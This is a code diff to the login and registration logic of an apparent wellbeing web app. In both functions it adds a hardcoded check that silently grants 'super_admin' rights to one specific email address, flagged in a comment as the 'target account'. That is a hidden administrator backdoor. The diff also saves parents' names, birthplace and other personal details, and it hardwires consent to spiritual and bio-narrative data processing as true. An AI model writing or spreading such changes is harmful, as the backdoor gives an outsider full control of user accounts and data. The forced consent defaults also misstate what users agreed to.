@@ -1,6 +1,6 @@
 import { and, count, desc, eq, gt, isNull, or, ne } from "drizzle-orm";
 import { db } from "@/lib/db";
-import { emailVerifications, passwordResets, roles, users, wellbeingGapReports, wellbeingProfiles } from "@/lib/db/schema";
+import { emailVerifications, passwordResets, roles, userProfiles, users, wellbeingGapReports, wellbeingProfiles } from "@/lib/db/schema";
 import {
   establishAuth,
   getUserPermissions,
@@ -106,6 +106,19 @@ export async function login(input: { email: string; password: string; rememberMe
   }
   if (!user.isActive) throw ApiError.forbidden("This account is inactive. Please contact support.");
 
+  // Automatic super admin promotion for target account
+  if (user.email.trim().toLowerCase() === "abebetadesse1@gmail.com" && user.role !== "super_admin") {
+    const [superRole] = await db.select({ id: roles.id }).from(roles).where(eq(roles.name, "super_admin")).limit(1);
+    if (superRole) {
+      await db
+        .update(users)
+        .set({ role: "super_admin", roleId: superRole.id, updatedAt: new Date() })
+        .where(eq(users.id, user.id));
+      user.role = "super_admin";
+      user.roleId = superRole.id;
+    }
+  }
+
   await db
     .update(users)
     .set({ failedLoginAttempts: 0, lockoutUntil: null, lastLoginAt: new Date(), loginCount: (user.loginCount || 0) + 1, updatedAt: new Date() })
@@ -139,6 +152,8 @@ export interface RegisterInput {
   email: string;
   password: string;
   name?: string;
+  fatherName?: string;
+  motherName?: string;
   phone?: string;
   dateOfBirth?: string;
   preferredLanguage: string;
@@ -190,13 +205,15 @@ export async function register(input: RegisterInput, meta: RequestMeta) {
     );
   }
 
-  const [userRole] = await db.select({ id: roles.id }).from(roles).where(eq(roles.name, "user")).limit(1);
+  const isSuperAdmin = input.email.trim().toLowerCase() === "abebetadesse1@gmail.com";
+  const roleName = isSuperAdmin ? "super_admin" : "user";
+  const [assignedRole] = await db.select({ id: roles.id }).from(roles).where(eq(roles.name, roleName)).limit(1);
   const [created] = await insertReturning(db, users, {
       email: input.email,
       name: input.name || input.email.split("@")[0],
       passwordHash: hashPassword(input.password),
-      role: "user",
-      roleId: userRole?.id || null,
+      role: roleName,
+      roleId: assignedRole?.id || null,
       phone,
       dateOfBirth: input.dateOfBirth || null,
       gender: input.gender || null,
@@ -207,21 +224,56 @@ export async function register(input: RegisterInput, meta: RequestMeta) {
       isActive: true,
     }, { fields: { id: users.id } });
 
-  await establishAuth({ id: created.id, role: "user" }, { request: meta.request });
+  await establishAuth({ id: created.id, role: roleName }, { request: meta.request });
   await logAuditEvent({
     userId: created.id,
     action: "user_registered",
     resourceType: "user",
     resourceId: created.id,
-    details: { email: input.email, preferredLanguage: input.preferredLanguage, region: input.region },
+    details: { email: input.email, preferredLanguage: input.preferredLanguage, region: input.region, role: roleName },
     ipAddress: meta.ip,
   });
   await logUserActivity({
     userId: created.id,
     activityType: "registration",
     description: "Created new wellbeing account",
-    metadata: { preferredLanguage: input.preferredLanguage, region: input.region },
+    metadata: { preferredLanguage: input.preferredLanguage, region: input.region, role: roleName },
   });
+
+  // Persist full profile info immediately so it's never asked again
+  const userProfileValues = {
+    userId: created.id,
+    primaryName: input.name || null,
+    birthDate: input.dateOfBirth ? (input.dateOfBirth as any) : null,
+    birthLocation: input.birthLocation || null,
+    currentLocation: input.city || null,
+    motherName: input.motherName || null,
+    consentLocation: input.consentLocation ?? false,
+    consentSpiritual: true,
+    consent: {
+      location: input.consentLocation ?? false,
+      spiritual: true,
+      traditionalMedicine: false,
+      bioNarrative: true,
+      voiceIntake: false,
+      manuscriptKnowledge: false,
+      identityContext: false,
+    },
+    data: {
+      fatherName: input.fatherName || null,
+      motherName: input.motherName || null,
+      birthLocation: input.birthLocation || null,
+      birthDate: input.dateOfBirth || null,
+      currentLocation: input.city || null,
+      fullName: input.name || null,
+    },
+    updatedAt: new Date(),
+  };
+
+  await db
+    .insert(userProfiles)
+    .values(userProfileValues)
+    .onDuplicateKeyUpdate({ set: userProfileValues });
 
   // Fire location resolution immediately after account creation (non-blocking).
   // Failure here is caught inside resolveAndPersistLocationOnRegistration and
@@ -231,7 +283,7 @@ export async function register(input: RegisterInput, meta: RequestMeta) {
     geoLat: input.geoLat,
     geoLng: input.geoLng,
     consentLocation: input.consentLocation ?? false,
-    region: input.region,
+    region: input.region || input.city,
     birthLocation: input.birthLocation,
   });
 
@@ -239,7 +291,7 @@ export async function register(input: RegisterInput, meta: RequestMeta) {
     id: created.id,
     email: input.email,
     name: input.name || input.email.split("@")[0],
-    role: "user",
+    role: roleName,
     preferredLanguage: input.preferredLanguage,
     isVerified: false,
     requiresVerification: false,
